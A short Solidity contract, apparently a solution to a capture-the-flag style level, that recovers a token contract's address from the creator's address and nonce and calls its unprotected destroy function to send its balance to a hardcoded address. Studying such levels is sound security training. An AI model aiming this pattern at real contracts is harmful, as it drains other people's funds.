// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "SimpleToken.sol";

//RLP = Recursive length prefix
//address = rightmost20bytes(keccak256(RLP(sender address, nonce)))

// web3.utils.keccak256("0xd6", "0x94", "0xd0304257A55cc5e9022ae8b6A3AfEaAc5bD6f49F","0x01")

contract RecoveryAttack {

    SimpleToken public victim;

    constructor(address payable _victim) public{
        victim = SimpleToken(_victim);
    }

    function attack() public {
       victim.destroy(0x1f7972A40f8129A311e6C6a089f87347adc0e244);
    }

}